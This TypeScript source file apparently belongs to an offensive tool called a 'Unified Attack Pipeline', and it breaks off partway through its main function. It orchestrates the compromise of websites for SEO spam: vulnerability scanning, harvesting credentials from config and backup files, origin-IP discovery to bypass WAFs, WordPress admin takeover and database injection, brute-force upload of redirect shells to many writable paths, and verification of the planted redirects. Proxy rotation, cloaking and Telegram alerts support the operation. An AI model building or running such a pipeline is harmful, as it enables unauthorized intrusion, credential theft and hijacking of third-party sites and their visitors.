/**
 * Unified Attack Pipeline — Chains together:
 *   1. AI Vulnerability Analysis (deep scan)
 *   2. Shell Generation (tailored per target)
 *   3. Multi-Method Upload (aggressive fallback chain)
 *   4. Verification (HTTP check + redirect test)
 *
 * This is the "brain" that makes Autonomous Friday + SEO Spam work together.
 */
import { preScreenTarget, type PreScreenResult } from "./ai-prescreening";
import { fullVulnScan, type VulnScanResult, type RankedAttackVector, type ServerInfo, type CmsDetection } from "./ai-vuln-analyzer";
import { generateShellsForTarget, pickBestShell, generateUnconditionalHtmlRedirect, generateUnconditionalHtaccessRedirect, generateMetaRedirectHtml, generateJsRedirect, type GeneratedShell, type ShellGenerationConfig } from "./ai-shell-generator";
import { oneClickDeploy, type DeployResult, type DeployOptions, type ProgressEvent as DeployProgressEvent } from "./one-click-deploy";
import { tryAllUploadMethods, type UploadAttemptResult } from "./alt-upload-methods";
import { multiVectorParallelUpload, smartRetryUpload, type EnhancedUploadResult, type ParallelUploadConfig } from "./enhanced-upload-engine";
// ─── NEW ENGINES ───
import { runWafBypass, type WafBypassResult, type WafBypassConfig } from "./waf-bypass-engine";
import { runAllAltUploadVectors, type AltUploadResult, type AltUploadConfig } from "./alt-upload-vectors";
import { runAllIndirectAttacks as runIndirectAttacks, type IndirectAttackResult, type IndirectAttackConfig } from "./indirect-attack-engine";
import { runAllDnsAttacks as runDnsAttacks, type DnsAttackResult, type DnsAttackConfig } from "./dns-domain-attacks";
import { runAllConfigExploits as runConfigExploits, type ConfigExploitResult, type ConfigExploitConfig } from "./config-exploitation";
import { generateCloakingPackage, type CloakingConfig, type CloakingShell as CloakingShellResult } from "./cloaking-shell-generator";
import { generateContentPack, type ContentConfig, type ContentPack } from "./cloaking-content-engine";
import { executeInjection, type InjectionConfig, type InjectionResult } from "./php-injector";
import { uploadContentToCdn, type CdnUploadResult } from "./content-cdn";
import { sendTelegramNotification, type TelegramNotification } from "./telegram-notifier";
import { runWpAdminTakeover, runShellExecFallback, type WpAdminConfig, type WpTakeoverResult } from "./wp-admin-takeover";
import { runWpDbInjection, type WpDbInjectionConfig, type WpDbInjectionResult } from "./wp-db-injection";
import { proxyPool } from "./proxy-pool";
import { runShelllessAttacks, type ShelllessResult, type ShelllessConfig } from "./shellless-attack-engine";

// ═══════════════════════════════════════════════════════
//  TYPES
// ═══════════════════════════════════════════════════════

export interface PipelineConfig {
  targetUrl: string;
  redirectUrl: string;
  seoKeywords: string[];
  cloaking?: boolean;
  geoRedirect?: boolean;
  parasiteContent?: "short" | "medium" | "long";
  maxUploadAttempts?: number;
  timeoutPerMethod?: number;
  // Cloaking options (fdv.uni-lj.si style)
  enableCloaking?: boolean;
  cloakingBrand?: string;
  cloakingContentType?: "landing" | "article" | "doorway" | "review";
  // Advanced attack options
  enableWafBypass?: boolean;
  enableAltUpload?: boolean;
  enableIndirectAttacks?: boolean;
  enableDnsAttacks?: boolean;
  enableConfigExploit?: boolean;
  enableWpAdminTakeover?: boolean;
  enableWpDbInjection?: boolean;
  proxyUrl?: string; // residential proxy support
  // Method priority & advanced config
  methodPriority?: Array<{ id: string; enabled: boolean }>;
  proxyList?: string[]; // multiple proxy URLs
  weightedRedirects?: Array<{ url: string; weight: number }>;
}

export interface PipelineEvent {
  phase: "prescreen" | "vuln_scan" | "shell_gen" | "upload" | "verify" | "complete" | "error" | "waf_bypass" | "alt_upload" | "indirect" | "dns_attack" | "config_exploit" | "recon" | "cloaking" | "wp_admin" | "wp_db_inject" | "world_update" | "shellless" | "email";
  step: string;
  detail: string;
  progress: number; // 0-100
  data?: any;
}

export interface UploadedFile {
  url: string;
  shell: GeneratedShell;
  method: string;
  verified: boolean;
  redirectWorks: boolean;
  redirectDestinationMatch: boolean;
  finalDestination: string;
  httpStatus: number;
  redirectChain?: string[];
}

export interface PipelineResult {
  success: boolean;
  targetUrl: string;
  redirectUrl: string;
  prescreen: PreScreenResult | null;
  vulnScan: VulnScanResult | null;
  shellsGenerated: number;
  uploadAttempts: number;
  uploadedFiles: UploadedFile[];
  verifiedFiles: UploadedFile[];
  totalDuration: number;
  aiDecisions: string[];
  errors: string[];
  // Advanced attack results
  wafBypassResults?: WafBypassResult[];
  altUploadResults?: AltUploadResult[];
  indirectAttackResults?: IndirectAttackResult[];
  dnsAttackResults?: DnsAttackResult[];
  configExploitResults?: ConfigExploitResult[];
  originIp?: string;
  discoveredCredentials?: any[];
  // WP Admin Takeover & DB Injection results
  wpAdminResults?: WpTakeoverResult[];
  wpDbInjectionResults?: WpDbInjectionResult[];
  // Shellless attack results
  shelllessResults?: ShelllessResult[];
  // Cloaking results
  cloakingShell?: CloakingShellResult | null;
  contentPack?: ContentPack | null;
  // Injection & CDN results
  injectionResult?: InjectionResult | null;
  cdnUploadResult?: CdnUploadResult | null;
  telegramSent?: boolean;
  emailSent?: boolean;
}

type EventCallback = (event: PipelineEvent) => void;

// ═══════════════════════════════════════════════════════
//  VERIFICATION
// ═══════════════════════════════════════════════════════

interface VerificationResult {
  verified: boolean;
  redirectWorks: boolean;
  redirectDestinationMatch: boolean;
  finalDestination: string;
  httpStatus: number;
  phpNotExecuting?: boolean;
  redirectChain?: string[];
}

/**
 * Follow a redirect chain (HTTP 3xx) up to maxHops.
 * Returns the chain of URLs and the final destination.
 */
async function followRedirectChain(startUrl: string, maxHops = 10): Promise<{ chain: string[]; finalUrl: string; finalStatus: number }> {
  const chain: string[] = [startUrl];
  let currentUrl = startUrl;
  let finalStatus = 0;

  for (let i = 0; i < maxHops; i++) {
    try {
      const resp = await fetch(currentUrl, {
        method: "GET",
        redirect: "manual",
        headers: {
          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
          "Referer": "https://www.google.com/search?q=test",
        },
        signal: AbortSignal.timeout(8000),
      });
      finalStatus = resp.status;

      if (resp.status >= 300 && resp.status < 400) {
        const loc = resp.headers.get("location");
        if (!loc) break;
        // Resolve relative URLs
        const nextUrl = loc.startsWith("http") ? loc : new URL(loc, currentUrl).href;
        chain.push(nextUrl);
        currentUrl = nextUrl;
        continue;
      }
      break; // Not a redirect, stop
    } catch {
      break;
    }
  }
  return { chain, finalUrl: currentUrl, finalStatus };
}

/**
 * Check if two URLs point to the same destination.
 * Compares hostname + pathname, ignoring trailing slashes, query params, and protocol.
 */
function urlsMatchDestination(actual: string, expected: string): boolean {
  try {
    const a = new URL(actual);
    const e = new URL(expected);
    // Hostname match (case-insensitive)
    if (a.hostname.toLowerCase() !== e.hostname.toLowerCase()) return false;
    // Path match (normalize trailing slash)
    const normPath = (p: string) => p.replace(/\/+$/, "") || "/";
    if (normPath(a.pathname) !== normPath(e.pathname) && normPath(e.pathname) !== "/") return false;
    return true;
  } catch {
    // Fallback: simple string containment
    return actual.includes(expected) || expected.includes(actual);
  }
}

async function verifyUploadedFile(
  fileUrl: string,
  redirectUrl: string,
  onEvent: EventCallback,
): Promise<VerificationResult> {
  try {
    // ─── Step 1: Check if file is accessible (not 403/404) ───
    const resp = await fetch(fileUrl, {
      method: "GET",
      redirect: "manual",
      headers: {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
      },
      signal: AbortSignal.timeout(10000),
    });

    const httpStatus = resp.status;

    if (httpStatus === 403 || httpStatus === 404 || httpStatus === 500) {
      onEvent({
        phase: "verify",
        step: "file_check",
        detail: `❌ ไฟล์ไม่สามารถเข้าถึงได้ (HTTP ${httpStatus}): ${fileUrl}`,
        progress: 0,
      });
      return { verified: false, redirectWorks: false, redirectDestinationMatch: false, finalDestination: "", httpStatus, redirectChain: [] };
    }

    // ─── Step 2: Check PHP execution ───
    let phpNotExecuting = false;
    if (fileUrl.endsWith(".php") && httpStatus === 200) {
      try {
        const phpCheckResp = await fetch(fileUrl, {
          method: "GET",
          headers: { "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" },
          signal: AbortSignal.timeout(10000),
        });
        const phpBody = await phpCheckResp.text();
        if (phpBody.includes("<?php") || phpBody.includes("@ini_set") || phpBody.includes("$_SERVER") || phpBody.includes('header("')) {
          phpNotExecuting = true;
          onEvent({
            phase: "verify",
            step: "php_check",
            detail: `⚠️ PHP ไม่ถูก execute (server serve เป็น plain text) — ต้องใช้ .html แทน: ${fileUrl}`,
            progress: 40,
          });
        }
      } catch { /* ignore */ }
    }

    // ─── Step 3: Follow redirect chain with Google referer + ?r=1 ───
    const triggerUrl = fileUrl + "?r=1";
    const { chain, finalUrl, finalStatus } = await followRedirectChain(triggerUrl);
    const redirectChain = chain;

    // Check if we got a server-side redirect (3xx chain)
    let redirectWorks = false;
    let redirectDestinationMatch = false;
    let finalDestination = finalUrl;

    if (chain.length > 1) {
      // We followed at least one redirect hop
      redirectWorks = true;
      redirectDestinationMatch = urlsMatchDestination(finalUrl, redirectUrl);

      if (redirectDestinationMatch) {
        onEvent({
          phase: "verify",
          step: "redirect_destination",
          detail: `✅ Redirect ทำงานจริง! ${fileUrl} → ${finalUrl} (ตรงกับปลายทาง ${redirectUrl})`,
          progress: 100,
        });
      } else {
        onEvent({
          phase: "verify",
          step: "redirect_destination",
          detail: `⚠️ Redirect ทำงานแต่ไปผิดที่! ${fileUrl} → ${finalUrl} (ควรไป ${redirectUrl})`,
          progress: 70,
        });
      }
    }

    // ─── Step 4: Check body for JS/meta redirect if no server-side redirect ───
    if (!redirectWorks && (httpStatus === 200 || httpStatus === 301 || httpStatus === 302)) {
      try {
        const bodyResp = await fetch(triggerUrl, {
          method: "GET",
          headers: {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Referer": "https://www.google.com/search?q=test",
          },
          signal: AbortSignal.timeout(10000),
        });
        const body = await bodyResp.text();
        const hasJsRedirect = body.includes("window.location") || body.includes("location.replace") || body.includes("location.href");
        const hasMetaRedirect = body.includes('http-equiv="refresh"') || body.includes("http-equiv='refresh'");

        if (hasJsRedirect || hasMetaRedirect) {
          redirectWorks = true;

          // Extract the actual redirect target from the body
          let extractedTarget = "";
          // Try meta refresh: content="0;url=https://..."
          const metaMatch = body.match(/content\s*=\s*["'][^"']*url\s*=\s*([^"'\s>]+)/i);
          if (metaMatch) extractedTarget = metaMatch[1];
          // Try JS: window.location = "https://..."
          if (!extractedTarget) {
            const jsMatch = body.match(/(?:window\.location|location\.(?:href|replace))\s*[=(]\s*["']([^"']+)["']/i);
            if (jsMatch) extractedTarget = jsMatch[1];
          }

          if (extractedTarget) {
            finalDestination = extractedTarget;
            redirectDestinationMatch = urlsMatchDestination(extractedTarget, redirectUrl);
          } else {
            // Can't extract target, fallback to hostname check
            const hasRedirectUrl = body.includes(redirectUrl) || body.includes(new URL(redirectUrl).hostname);
            redirectDestinationMatch = hasRedirectUrl;
            finalDestination = hasRedirectUrl ? redirectUrl : "unknown";
          }

          if (redirectDestinationMatch) {
            onEvent({
              phase: "verify",
              step: "redirect_destination",
              detail: `✅ Redirect ทำงานจริง! (via ${hasJsRedirect ? "JS" : "meta refresh"}) ${fileUrl} → ${finalDestination}`,
              progress: 100,
            });
          } else {
            onEvent({
              phase: "verify",
              step: "redirect_destination",
              detail: `⚠️ Redirect ทำงานแต่ไปผิดที่! (via ${hasJsRedirect ? "JS" : "meta refresh"}) ${fileUrl} → ${finalDestination} (ควรไป ${redirectUrl})`,
              progress: 70,
            });
          }
        }
      } catch { /* ignore */ }
    }

    // ─── Step 5: Final verdict ───
    if (!redirectWorks) {
      onEvent({
        phase: "verify",
        step: "redirect_check",
        detail: `⚠️ ไฟล์เข้าถึงได้ (HTTP ${httpStatus}) แต่ redirect ยังไม่ทำงาน: ${fileUrl}`,
        progress: 50,
      });
    }

    return {
      verified: httpStatus >= 200 && httpStatus < 400,
      redirectWorks,
      redirectDestinationMatch,
      finalDestination,
      httpStatus,
      phpNotExecuting,
      redirectChain,
    };
  } catch (error: any) {
    onEvent({
      phase: "verify",
      step: "error",
      detail: `❌ Verification error: ${error.message}`,
      progress: 0,
    });
    return { verified: false, redirectWorks: false, redirectDestinationMatch: false, finalDestination: "", httpStatus: 0, phpNotExecuting: false, redirectChain: [] };
  }
}

// ═══════════════════════════════════════════════════════
//  UPLOAD ORCHESTRATOR
// ═══════════════════════════════════════════════════════

// ─── Method priority mapping ───
const METHOD_REGISTRY: Record<string, string> = {
  oneclick: "oneClickDeploy",
  wp_admin: "wpAdminTakeover",
  wp_db: "wpDbInjection",
  alt_upload: "altUploadVectors",
  waf_bypass: "wafBypass",
  indirect: "indirectAttacks",
  dns: "dnsAttacks",
  config_exploit: "configExploitation",
  try_all: "tryAllUploadMethods",
  parallel: "multiVectorParallel",
  smart_retry: "smartRetryUpload",
};

function getEnabledMethods(config: PipelineConfig): string[] {
  if (!config.methodPriority || config.methodPriority.length === 0) {
    // Default order
    return ["oneclick", "try_all", "parallel", "smart_retry"];
  }
  return config.methodPriority
    .filter(m => m.enabled)
    .map(m => m.id);
}

// ─── Weighted redirect selection ───
function selectRedirectUrl(config: PipelineConfig): string {
  if (!config.weightedRedirects || config.weightedRedirects.length === 0) {
    return config.redirectUrl;
  }
  const totalWeight = config.weightedRedirects.reduce((sum, r) => sum + r.weight, 0);
  let random = Math.random() * totalWeight;
  for (const wr of config.weightedRedirects) {
    random -= wr.weight;
    if (random <= 0) return wr.url;
  }
  return config.weightedRedirects[0].url;
}

// ─── Proxy rotation (with residential proxy pool fallback) ───
function selectProxy(config: PipelineConfig): string | undefined {
  // 1. User-provided proxy list takes priority
  if (config.proxyList && config.proxyList.length > 0) {
    return config.proxyList[Math.floor(Math.random() * config.proxyList.length)];
  }
  // 2. User-provided single proxy
  if (config.proxyUrl) {
    return config.proxyUrl;
  }
  // 3. Auto-select from residential proxy pool
  const poolProxy = proxyPool.getProxy("weighted");
  return poolProxy?.url;
}

async function uploadShellWithAllMethods(
  targetUrl: string,
  shell: GeneratedShell,
  prescreen: PreScreenResult | null,
  vulnScan: VulnScanResult | null,
  config: PipelineConfig,
  onEvent: EventCallback,
): Promise<{ success: boolean; url: string; method: string }> {
  const fileContent = typeof shell.content === "string" ? shell.content : shell.content.toString("base64");
  const timeout = config.timeoutPerMethod || 30000;
  const enabledMethods = getEnabledMethods(config);
  const effectiveRedirectUrl = selectRedirectUrl(config);
  const proxyUrl = selectProxy(config);

  onEvent({
    phase: "upload",
    step: "method_plan",
    detail: `📋 Upload plan: ${enabledMethods.length} methods enabled — ${enabledMethods.map(m => METHOD_REGISTRY[m] || m).join(" → ")}${proxyUrl ? " (via proxy)" : ""}`,
    progress: 10,
  });

  // Method 1: oneClickDeploy (full pipeline)
  if (!enabledMethods.includes("oneclick") && enabledMethods.length > 0) {
    // Skip if not in priority list
  } else {
  onEvent({
    phase: "upload",
    step: "oneclick",
    detail: `📤 Method 1: oneClickDeploy — ${shell.filename}`,
    progress: 10,
  });

  try {
    const deployOpts: DeployOptions = {
      maxRetries: 3,
      uploadTimeout: timeout,
      verifyTimeout: 10000,
      seoKeywords: config.seoKeywords,
      enableParasitePages: true,
      parasiteContentLength: config.parasiteContent || "medium",
      preScreenResult: prescreen || undefined,
      onProgress: (event: DeployProgressEvent) => {
        onEvent({
          phase: "upload",
          step: "oneclick",
          detail: `oneClickDeploy: ${event.detail || event.phaseName || ""}`,
          progress: 10 + (event.progress || 0) * 0.2,
        });
      },
    };

    const result: DeployResult = await Promise.race([
      oneClickDeploy(targetUrl, config.redirectUrl, deployOpts),
      new Promise<DeployResult>((_, reject) => setTimeout(() => reject(new Error("oneClickDeploy timeout")), timeout + 15000)),
    ]);

    const shellUrl = result.shellInfo?.url || result.deployedFiles?.find(f => f.status === "deployed" && f.url)?.url;
    // Check success via: explicit success flag, OR redirect active, OR files deployed
    const isSuccess = result.success || result.summary?.redirectActive || (result.summary?.totalFilesDeployed ?? 0) > 0;
    if (isSuccess && shellUrl) {
      onEvent({
        phase: "upload",
        step: "oneclick_success",
        detail: `✅ oneClickDeploy สำเร็จ: ${shellUrl}`,
        progress: 30,
      });
      return { success: true, url: shellUrl, method: "oneClickDeploy" };
    }
  } catch (error: any) {
    onEvent({
      phase: "upload",
      step: "oneclick_fail",
      detail: `⚠️ oneClickDeploy ล้มเหลว: ${error.message} — ลอง method ถัดไป`,
      progress: 25,
    });
  }
  } // end oneclick block

  // Method 2: tryAllUploadMethods (FTP, CMS exploits, WebDAV, API endpoints)
  if (prescreen && (enabledMethods.includes("try_all") || enabledMethods.length === 0)) {
    onEvent({
      phase: "upload",
      step: "all_methods",
      detail: `📤 Method 2: tryAllUploadMethods — ${shell.filename}`,
      progress: 30,
    });

    try {
      const results: UploadAttemptResult[] = await Promise.race([
        tryAllUploadMethods(
          targetUrl,
          prescreen,
          fileContent,
          shell.filename,
          "/",
          (method, status) => {
            onEvent({
              phase: "upload",
              step: "all_methods",
              detail: `tryAll: [${method}] ${status}`,
              progress: 35,
            });
          },
        ),
        new Promise<UploadAttemptResult[]>((_, reject) => setTimeout(() => reject(new Error("tryAllUploadMethods timeout")), timeout + 30000)),
      ]);

      const successResult = results.find(r => r.success && r.fileUrl);
      if (successResult && successResult.fileUrl) {
        onEvent({
          phase: "upload",
          step: "all_methods_success",
          detail: `✅ ${successResult.method} สำเร็จ: ${successResult.fileUrl}`,
          progress: 50,
        });
        return { success: true, url: successResult.fileUrl, method: successResult.method };
      }
    } catch (error: any) {
      onEvent({
        phase: "upload",
        step: "all_methods_fail",
        detail: `⚠️ tryAllUploadMethods ล้มเหลว: ${error.message}`,
        progress: 45,
      });
    }
  }

  // Method 3: multiVectorParallelUpload (brute force parallel)
  if (!enabledMethods.includes("parallel") && enabledMethods.length > 0) {
    // Skip
  } else {
  onEvent({
    phase: "upload",
    step: "parallel",
    detail: `📤 Method 3: multiVectorParallelUpload — ${shell.filename}`,
    progress: 50,
  });

  try {
    // Comprehensive fallback paths when vuln scan finds no writable paths
    const scanPaths = vulnScan?.writablePaths?.length ? vulnScan.writablePaths.map(w => w.path) : null;
    const prescreenPaths = prescreen?.writablePaths?.length ? prescreen.writablePaths : null;
    const uploadPaths = scanPaths || prescreenPaths || [
      "/wp-content/uploads/", "/uploads/", "/images/", "/tmp/",
      "/wp-content/themes/", "/wp-content/plugins/", "/wp-includes/",
      "/media/", "/assets/", "/cache/", "/files/",
      "/public/uploads/", "/content/images/", "/data/", "/backup/",
    ];
    const parallelConfig: ParallelUploadConfig = {
      targetUrl,
      fileContent,
      fileName: shell.filename,
      uploadPaths,
      prescreen,
      timeout,
      onMethodProgress: (method, status) => {
        onEvent({
          phase: "upload",
          step: "parallel",
          detail: `parallel: [${method}] ${status}`,
          progress: 55,
        });
      },
    };

    const result = await Promise.race([
      multiVectorParallelUpload(parallelConfig),
      new Promise<any>((_, reject) => setTimeout(() => reject(new Error("parallel upload timeout")), timeout + 30000)),
    ]);

    if (result.success && result.bestResult?.fileUrl) {
      onEvent({
        phase: "upload",
        step: "parallel_success",
        detail: `✅ Parallel upload สำเร็จ: ${result.bestResult.fileUrl}`,
        progress: 70,
      });
      return { success: true, url: result.bestResult.fileUrl, method: `parallel_${result.bestResult.method}` };
    }
  } catch (error: any) {
    onEvent({
      phase: "upload",
      step: "parallel_fail",
      detail: `⚠️ Parallel upload ล้มเหลว: ${error.message}`,
      progress: 65,
    });
  }
  } // end parallel block

  // Method 4: smartRetryUpload (adaptive retry with increasing timeouts)
  if (!enabledMethods.includes("smart_retry") && enabledMethods.length > 0) {
    // Skip
  } else {
  onEvent({
    phase: "upload",
    step: "smart_retry",
    detail: `📤 Method 4: smartRetryUpload — ${shell.filename}`,
    progress: 70,
  });

  try {
    // Comprehensive fallback paths for smart retry
    const scanPaths2 = vulnScan?.writablePaths?.length ? vulnScan.writablePaths.map(w => w.path) : null;
    const prescreenPaths2 = prescreen?.writablePaths?.length ? prescreen.writablePaths : null;
    const uploadPaths = scanPaths2 || prescreenPaths2 || [
      "/wp-content/uploads/", "/uploads/", "/images/",
      "/wp-content/themes/", "/tmp/", "/media/",
      "/assets/", "/cache/", "/files/",
    ];
    const retryConfig: ParallelUploadConfig = {
      targetUrl,
      fileContent,
      fileName: shell.filename,
      uploadPaths,
      prescreen,
      timeout: timeout + 10000,
      onMethodProgress: (method, status) => {
        onEvent({
          phase: "upload",
          step: "smart_retry",
          detail: `smartRetry: [${method}] ${status}`,
          progress: 75,
        });
      },
    };

    const result = await Promise.race([
      smartRetryUpload(retryConfig, 3),
      new Promise<any>((_, reject) => setTimeout(() => reject(new Error("smart retry timeout")), (timeout + 10000) * 3 + 30000)),
    ]);

    if (result.success && result.bestResult?.fileUrl) {
      onEvent({
        phase: "upload",
        step: "smart_retry_success",
        detail: `✅ Smart retry สำเร็จ: ${result.bestResult.fileUrl}`,
        progress: 85,
      });
      return { success: true, url: result.bestResult.fileUrl, method: `smart_retry_${result.bestResult.method}` };
    }
  } catch (error: any) {
    onEvent({
      phase: "upload",
      step: "smart_retry_fail",
      detail: `⚠️ Smart retry ล้มเหลว: ${error.message}`,
      progress: 80,
    });
  }
  } // end smart_retry block

  return { success: false, url: "", method: "all_failed" };
}

// ═══════════════════════════════════════════════════════
//  MAIN PIPELINE
// ═══════════════════════════════════════════════════════

export async function runUnifiedAttackPipeline(
  config: PipelineConfig,
  onEvent: EventCallback = () => {},
): Promise<PipelineResult> {
  const startTime = Date.now();
  const aiDecisions: string[] = [];
  const errors: string[] = [];
  const uploadedFiles: UploadedFile[] = [];
  let prescreen: PreScreenResult | null = null;
  let vulnScan: VulnScanResult | null = null;

  onEvent({
    phase: "prescreen",
    step: "start",
    detail: `🔍 เริ่มวิเคราะห์เป้าหมาย: ${config.targetUrl}`,
    progress: 0,
  });

  // ─── Phase 1: Pre-screening ───
  try {
    onEvent({
      phase: "prescreen",
      step: "scanning",
      detail: "🔍 Phase 1: AI Pre-screening — วิเคราะห์ server, CMS, WAF, ports...",
      progress: 5,
    });

    prescreen = await Promise.race([
      preScreenTarget(config.targetUrl.replace(/^https?:\/\//, "").replace(/\/$/, "")),
      new Promise<PreScreenResult>((_, reject) => setTimeout(() => reject(new Error("prescreen timeout")), 60000)),
    ]);

    aiDecisions.push(`Pre-screen: ${prescreen.serverType || "Unknown"} server, CMS: ${prescreen.cms || "none"}, WAF: ${prescreen.wafDetected || "none"}, Success probability: ${prescreen.overallSuccessProbability}%`);

    onEvent({
      phase: "prescreen",
      step: "complete",
      detail: `✅ Pre-screen เสร็จ — Server: ${prescreen.serverType || "Unknown"}, CMS: ${prescreen.cms || "none"}, WAF: ${prescreen.wafDetected || "none"}, โอกาสสำเร็จ: ${prescreen.overallSuccessProbability}%`,
      progress: 15,
      data: { prescreen },
    });

    // Emit world state update after prescreen
    onEvent({
      phase: "world_update",
      step: "prescreen_done",
      detail: "World state updated from pre-screen",
      progress: 15,
      data: {
        hosts: 1,
        ports: 0,
        vulns: 0,
        creds: 0,
        uploadPaths: prescreen.writablePaths?.length || 0,
        shellUrls: 0,
        deployedFiles: 0,
        verifiedUrls: 0,
      },
    });
  } catch (error: any) {
    errors.push(`Pre-screen failed: ${error.message}`);
    onEvent({
      phase: "prescreen",
      step: "error",
      detail: `⚠️ Pre-screen ล้มเหลว: ${error.message} — ดำเนินการต่อด้วยข้อมูลจำกัด`,
      progress: 15,
    });
  }

  // ─── Phase 2: Deep Vulnerability Scan ───
  try {
    onEvent({
      phase: "vuln_scan",
      step: "scanning",
      detail: "🔬 Phase 2: AI Deep Scan — ค้นหาช่องโหว่, writable paths, upload endpoints...",
      progress: 20,
    });

    vulnScan = await Promise.race([
      fullVulnScan(config.targetUrl, (step: string, detail: string, progress: number) => {
        onEvent({
          phase: "vuln_scan",
          step,
          detail: `🔬 ${detail}`,
          progress: 20 + (progress / 100) * 15,
        });
      }),
      new Promise<VulnScanResult>((_, reject) => setTimeout(() => reject(new Error("vuln scan timeout")), 120000)),
    ]);

    if (vulnScan) {
      const topVectors = vulnScan.attackVectors.slice(0, 3);
      aiDecisions.push(`Deep scan: ${vulnScan.writablePaths.length} writable paths, ${vulnScan.uploadEndpoints.length} upload endpoints, ${vulnScan.attackVectors.length} attack vectors`);
      aiDecisions.push(`Top vectors: ${topVectors.map(v => `${v.name} (${v.successProbability}%)`).join(", ")}`);

      onEvent({
        phase: "vuln_scan",
        step: "complete",
        detail: `✅ Deep scan เสร็จ — ${vulnScan.writablePaths.length} writable paths, ${vulnScan.attackVectors.length} attack vectors`,
        progress: 35,
        data: { vulnScan },
      });

      // Emit world state update after vuln scan
      onEvent({
        phase: "world_update",
        step: "vulnscan_done",
        detail: "World state updated from vulnerability scan",
        progress: 35,
        data: {
          hosts: 1,
          ports: 0,
          vulns: vulnScan.misconfigurations?.length || 0,
          creds: 0,
          uploadPaths: vulnScan.writablePaths?.length || 0,
          shellUrls: 0,
          deployedFiles: 0,
          verifiedUrls: 0,
        },
      });
    }
  } catch (error: any) {
    errors.push(`Vuln scan failed: ${error.message}`);
    onEvent({
      phase: "vuln_scan",
      step: "error",
      detail: `⚠️ Deep scan ล้มเหลว: ${error.message} — ใช้ข้อมูลจาก pre-screen`,
      progress: 35,
    });
  }

  // ─── Phase 2.5: Recon — Config Exploitation + DNS/Origin IP Discovery ───
  let configResults: ConfigExploitResult[] = [];
  let dnsResults: DnsAttackResult[] = [];
  let originIp: string | undefined;
  let discoveredCredentials: any[] = [];

  if (config.enableConfigExploit !== false) {
    try {
      onEvent({
        phase: "config_exploit",
        step: "scanning",
        detail: "🔓 Phase 2.5a: Config Exploitation — ค้นหา backup files, .env, phpinfo, credentials...",
        progress: 36,
      });

      configResults = await Promise.race([
        runConfigExploits({
          targetUrl: config.targetUrl,
          timeout: config.timeoutPerMethod || 30000,
          onProgress: (vector: string, detail: string) => {
            onEvent({
              phase: "config_exploit",
              step: vector,
              detail: `🔓 ${detail}`,
              progress: 37,
            });
          },
        }),
        new Promise<ConfigExploitResult[]>((_, reject) => setTimeout(() => reject(new Error("config exploit timeout")), 60000)),
      ]);

      const successExploits = configResults.filter(r => r.success);
      discoveredCredentials = configResults.filter(r => r.credentials).flatMap(r => r.credentials ? [r.credentials] : []);

      if (successExploits.length > 0) {
        aiDecisions.push(`Config exploit: ${successExploits.length} findings — ${successExploits.map(r => r.vector).join(", ")}`);
      }
      if (discoveredCredentials.length > 0) {
        aiDecisions.push(`🔑 Discovered ${discoveredCredentials.length} credentials — will use for authenticated uploads`);
      }

      onEvent({
        phase: "config_exploit",
        step: "complete",
        detail: `✅ Config exploit เสร็จ — ${successExploits.length} findings, ${discoveredCredentials.length} credentials`,
        progress: 38,
        data: { configResults, discoveredCredentials },
      });
    } catch (error: any) {
      errors.push(`Config exploit failed: ${error.message}`);
    }
  }

  if (config.enableDnsAttacks !== false) {
    try {
      onEvent({
        phase: "dns_attack",
        step: "scanning",
        detail: "🌐 Phase 2.5b: DNS Recon — Origin IP discovery, subdomain takeover, DNS rebinding...",
        progress: 38,
      });

      const targetDomain = config.targetUrl.replace(/^https?:\/\//, "").replace(/\/.*$/, "");
      dnsResults = await Promise.race([
        runDnsAttacks({
          targetDomain,
          timeout: config.timeoutPerMethod || 30000,
          onProgress: (vector: string, detail: string) => {
            onEvent({
              phase: "dns_attack",
              step: vector,
              detail: `🌐 ${detail}`,
              progress: 39,
            });
          },
        }),
        new Promise<DnsAttackResult[]>((_, reject) => setTimeout(() => reject(new Error("dns attacks timeout")), 60000)),
      ]);

      const successDns = dnsResults.filter(r => r.success);
      const originResult = dnsResults.find(r => r.vector === "origin_ip_discovery" && r.success && r.data?.originIp);
      if (originResult) {
        originIp = originResult.data!.originIp;
        aiDecisions.push(`🎯 Origin IP discovered: ${originIp} — will bypass WAF by targeting directly`);
      }
      const takeoverResult = dnsResults.find(r => r.vector === "subdomain_takeover" && r.success);
      if (takeoverResult) {
        aiDecisions.push(`🎯 Subdomain takeover possible: ${takeoverResult.data?.vulnerableSubdomains?.map(s => s.subdomain).join(", ") || "unknown"}`);
      }

      onEvent({
        phase: "dns_attack",
        step: "complete",
        detail: `✅ DNS recon เสร็จ — ${successDns.length} findings${originIp ? `, Origin IP: ${originIp}` : ""}`,
        progress: 40,
        data: { dnsResults, originIp },
      });
    } catch (error: any) {
      errors.push(`DNS attacks failed: ${error.message}`);
    }
  }

  // ─── Cloaking variables (will be populated AFTER upload succeeds) ───
  let cloakingResult: CloakingShellResult | null = null;
  let contentPack: ContentPack | null = null;

  // ─── Phase 3: Shell Generation ───
  let shells: GeneratedShell[] = [];
  try {
    onEvent({
      phase: "shell_gen",
      step: "generating",
      detail: "🔧 Phase 3: AI Shell Generation — สร้าง redirect shells ตาม target profile...",
      progress: 40,
    });

    const shellConfig: ShellGenerationConfig = {
      redirectUrl: config.redirectUrl,
      seoKeywords: config.seoKeywords,
      targetVectors: vulnScan?.attackVectors || [],
      serverInfo: vulnScan?.serverInfo || {
        ip: prescreen?.ipAddress || "0.0.0.0",
        server: prescreen?.serverType || "Unknown",
        poweredBy: prescreen?.phpVersion || "",
        os: prescreen?.osGuess || "unknown",
        phpVersion: prescreen?.phpVersion || "",
        waf: prescreen?.wafDetected || null,
        cdn: null,
        ssl: prescreen?.sslInfo?.enabled || false,
        httpMethods: [],
        headers: {},
      } as ServerInfo,
      cms: vulnScan?.cms || {
        type: (prescreen?.cms as CmsDetection["type"]) || "unknown",
        version: prescreen?.cmsVersion || "",
        plugins: prescreen?.cmsPlugins || [],
        themes: prescreen?.cmsTheme ? [prescreen.cmsTheme] : [],
        vulnerableComponents: [],
        adminUrl: "",
        loginUrl: "",
        apiEndpoints: [],
      } as CmsDetection,
      cloaking: config.cloaking !== false,
      geoRedirect: config.geoRedirect,
      parasiteContent: config.parasiteContent || "medium",
    };

    shells = await generateShellsForTarget(
      vulnScan || {
        target: config.targetUrl,
